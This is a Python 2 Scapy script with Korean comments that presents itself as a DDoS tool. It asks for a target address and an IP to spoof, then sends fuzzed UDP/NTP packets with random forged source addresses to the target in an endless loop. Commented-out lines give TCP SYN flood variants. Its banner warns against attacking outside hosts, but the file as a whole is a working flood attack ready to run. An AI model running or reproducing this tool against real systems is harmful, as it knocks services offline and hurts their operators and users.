#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket, subprocess, sys
from logging import getLogger, ERROR # Import Logging Things (로깅기능을 수행하기 위해 모듈을 불러온다.)
getLogger("scapy.runtime").setLevel(ERROR) # Get Rid if IPv6 Warning (IPv6에 대한 경고를 없앤다.)
from scapy.all import *
import time # sleep 적용하기 위해 time 모듈을 불러온다.

subprocess.call('clear',shell=True) # 콘솔명령어를 적용함
print """
\033[1;34m
                $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
                  ################################################################
                           ._________    _  ___________  __________  ____
                           |   |/  /     |__   __|       |   |__|  |
                           |   /  /        |\ /|         |   /__\  |
                           |   \  \        |/ \|         |   /__ \ |
                           | __|\__\       |\_/|         /__/|  |_\|
                          /\      \\/      //    \/        //      /\  \\/
                  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
                ######################################################################
\033[1;m
                                    \033[1;41mMAKE BY KIMTAEKHAN\033[1;m


                                      \033[1;44m[!] 경고 !!!!!\033[1;m
                        \033[1;44m함부로 외부에다가 공격시도 하지마세요 !!!!!\033[1;m

"""

############ 시간 설정 ############
time_counter=1.00 # 시간 설정 1초
###################################

################## 공격 설정  ##################

try:
        target = raw_input("\033[1;34m[*]\033[1;m \033[1;31m공격 목표의 주소를 입력하세요 : \033[1;m") # 공격 목표의 주소입력.
                #target = sys.argv[1]
        hideip = raw_input("\033[1;34m[*]\033[1;m \033[1;31m위장할 아이피를 입력하세요 : \033[1;m") # 공격자 아이피 위장.
                #hideip = sys.argv[2]

except KeyboardInterrupt: #사용자가 프로그램을 종료하고자 할때 키보드의 입력에 따른 메세지를 출력.
       print "\n\n\033[1;m \033[1;35m[!]\033[1;m\033[1;36m공격자의 명령에 의해 프로그램을 종료합니다.\033[1;m\n" # 메세지 출력
       print "\033[1;31m[!]\033[1;m \033[1;33m종료중\033[1;m" # 메세지 출력
       print "\033[1;34m   .\033[1;m" # 메세지 출력
       time.sleep(time_counter) # 설정 시간 적용
       print "\033[1;35m   .\033[1;m" # 메세지 출력
       time.sleep(time_counter) # 설정 시간 적용
       print "\033[1;36m   .\033[1;m" # 메세지 출력
       time.sleep(time_counter) # 설정 시간 적용
       print "\n\033[1;32m[!]\033[1;m \033[1;38m완료 !!\033[1;m" # 메세지 출력
       sys.exit(1) # 종료

print "\033[1;41mDDOS 공격을 시작합니다. !\033[1;m"

################################################

time_counter=1.00 # 시간 설정 1초

################## udp attack  ##################

try :
        while True :
                conf.verb = 0 # Hide output
                send_pkt=send(IP(src=RandIP(hideip), dst=target)/fuzz(UDP()/NTP(version=4)))
                                #send_pkt=send(IP(src=RandIP(hideip), dst=target)/fuzz(TCP(sport=RandShort(), flags="S")/NTP(version=4)))
                                #send_pkt=send(IP(src=RandIP(hideip), dst=target)/fuzz(TCP(sport=RandShort(), flags="S")/))
                """
                함수 fuzz()는 값을 무작위로 필드에 적용시킬수 있으면 객체에 의해 계산되지 않습니다.
                체크섬과같은 모든 기본값을 변경할수 있습니다. 이렇게 적용하면 fuzzing 템플리트를 빠르게 작성하여
                루프로 보낼수 있게됩니다.
                IP 계층은 RandIP 레이어 에서 1.1.1.1로 아이피가 위장되어 피해자에게 전달되게 됩니다.
                UDP 및 NTP 계층은 fuzz 값이 적용됩니다.
                UDP checksum은 정상적으로 동작하게되고, UDP 대상 포트는 NTP계층에 의해 123으로 오버로드
                되며, NTP 버전은 4로 강제 지정됩니다. 다른 모튼포트는 무작위로 지정 됩니다.
                """

                #if send_pkt==False :
                #        print "\033[1;31m패킷을 보내지 못하였습니다.\033[1;m"
                #else:
                #        print "\033[1;32m패킷을 보냈습니다.\033[1;m"

except KeyboardInterrupt: #사용자가 프로그램을 종료하고자 할때 키보드의 입력에 따른 메세지를 출력.
       print "\n\n\033[1;m \033[1;35m[!]\033[1;m\033[1;36m공격자의 명령에 의해 프로그램을 종료합니다.\033[1;m\n" # 메세지 출력
       print "\033[1;31m[!]\033[1;m \033[1;33m종료중\033[1;m" # 메세지 출력
       print "\033[1;34m   .\033[1;m" # 메세지 출력
       time.sleep(time_counter) # 설정 시간 적용
       print "\033[1;35m   .\033[1;m" # 메세지 출력
       time.sleep(time_counter) # 설정 시간 적용
       print "\033[1;36m   .\033[1;m" # 메세지 출력
       time.sleep(time_counter) # 설정 시간 적용
       print "\n\033[1;32m[!]\033[1;m \033[1;38m완료 !!\033[1;m" # 메세지 출력
       sys.exit(1) # 종료

################################################
